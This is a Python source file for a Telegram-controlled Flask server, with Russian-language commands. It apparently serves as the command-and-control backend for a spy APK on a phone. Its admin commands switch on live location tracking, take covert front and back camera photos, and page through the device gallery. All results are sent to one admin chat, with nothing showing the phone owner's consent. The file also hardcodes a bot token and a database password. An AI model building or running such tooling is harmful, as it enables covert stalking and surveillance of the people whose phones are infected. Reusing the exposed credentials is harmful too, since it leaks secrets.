import os
import telebot
import psycopg2
from flask import Flask, request
from telegram import InlineKeyboardButton, InlineKeyboardMarkup

BOT_TOKEN = "8662374904:AAEMd1FOnIyAmmqW_Gh0k5_Sgam-QUBk_bs"
ADMIN_ID = 8699816052
WEBHOOK_URL = "https://ghost-bot-97za.onrender.com"
DATABASE_URL = "postgresql://ghost_db_2bxc_user:CWGylqBJ2Bdl8lHRqldxCyTr4PWCrRPV@dpg-dahd5vuk1f9s73fclhgg-a/ghost_db_2bxc"

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

def get_db():
    return psycopg2.connect(DATABASE_URL, sslmode='require')

def init_db():
    conn = get_db()
    cur = conn.cursor()
    cur.execute('''
        CREATE TABLE IF NOT EXISTS commands (
            id SERIAL PRIMARY KEY,
            command TEXT NOT NULL,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            processed BOOLEAN DEFAULT FALSE
        )
    ''')
    conn.commit()
    cur.close()
    conn.close()

def add_command(command):
    conn = get_db()
    cur = conn.cursor()
    cur.execute("INSERT INTO commands (command) VALUES (%s)", (command,))
    conn.commit()
    cur.close()
    conn.close()

# ===== КОМАНДЫ =====

@bot.message_handler(commands=['start'])
def start(message):
    if message.chat.id != ADMIN_ID:
        return
    bot.send_message(message.chat.id,
        "🔐 Бот управления активирован.\n\n"
        "📍 ГЕО:\n"
        "/geo_on — включить трансляцию\n"
        "/geo_off — выключить трансляцию\n"
        "/geo — разовая гео\n\n"
        "📸 ГАЛЕРЕЯ:\n"
        "/photo — последнее фото\n"
        "/selfie — фото с фронталки\n"
        "/photo_back — фото с задней камеры\n"
    )

@bot.message_handler(commands=['geo_on'])
def geo_on(message):
    if message.chat.id != ADMIN_ID: return
    add_command("geo_on")
    bot.send_message(message.chat.id, "📍 Трансляция ВКЛЮЧЕНА")

@bot.message_handler(commands=['geo_off'])
def geo_off(message):
    if message.chat.id != ADMIN_ID: return
    add_command("geo_off")
    bot.send_message(message.chat.id, "📍 Трансляция ВЫКЛЮЧЕНА")

@bot.message_handler(commands=['geo'])
def geo(message):
    if message.chat.id != ADMIN_ID: return
    add_command("geo")
    bot.send_message(message.chat.id, "📍 Запрос отправлен")

@bot.message_handler(commands=['photo'])
def photo(message):
    if message.chat.id != ADMIN_ID: return
    add_command("gallery")
    keyboard = [[
        InlineKeyboardButton("⬅️ Назад", callback_data="prev"),
        InlineKeyboardButton("Вперёд ➡️", callback_data="next")
    ]]
    bot.send_message(message.chat.id, "📸 Загружаю...", reply_markup=InlineKeyboardMarkup(keyboard))

@bot.message_handler(commands=['selfie'])
def selfie(message):
    if message.chat.id != ADMIN_ID: return
    add_command("camera_front")
    bot.send_message(message.chat.id, "🤳 Делаю фото...")

@bot.message_handler(commands=['photo_back'])
def photo_back(message):
    if message.chat.id != ADMIN_ID: return
    add_command("camera_back")
    bot.send_message(message.chat.id, "📷 Делаю фото...")

@bot.callback_query_handler(func=lambda call: True)
def callback(call):
    if call.data == "next":
        add_command("gallery_next")
    elif call.data == "prev":
        add_command("gallery_prev")

# ===== API ДЛЯ APK =====

@app.route('/get_command', methods=['GET'])
def get_command():
    conn = get_db()
    cur = conn.cursor()
    cur.execute("SELECT id, command FROM commands WHERE processed = FALSE ORDER BY id LIMIT 1")
    row = cur.fetchone()
    if row:
        cur.execute("UPDATE commands SET processed = TRUE WHERE id = %s", (row[0],))
        conn.commit()
        cur.close()
        conn.close()
        return {'command': row[1]}
    cur.close()
    conn.close()
    return {'command': None}

@app.route('/send_photo', methods=['POST'])
def send_photo():
    data = request.get_json()
    if not data or 'image' not in data:
        return {'status': 'error'}, 400
    import base64, requests
    image_data = data['image']
    if ',' in image_data:
        image_data = image_data.split(',')[1]
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        files = {'photo': ('photo.jpg', base64.b64decode(image_data), 'image/jpeg')}
        payload = {'chat_id': ADMIN_ID, 'caption': '📸 Фото'}
        requests.post(url, files=files, data=payload)
        return {'status': 'ok'}
    except Exception as e:
        return {'status': 'error', 'message': str(e)}, 500

# ===== WEBHOOK =====

@app.route('/' + BOT_TOKEN, methods=['POST'])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        json_string = request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return '', 200
    return '', 403

@app.route('/')
def index():
    return 'Bot is running'

if __name__ == '__main__':
    init_db()
    bot.remove_webhook()
    bot.set_webhook(url=WEBHOOK_URL + '/' + BOT_TOKEN)
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
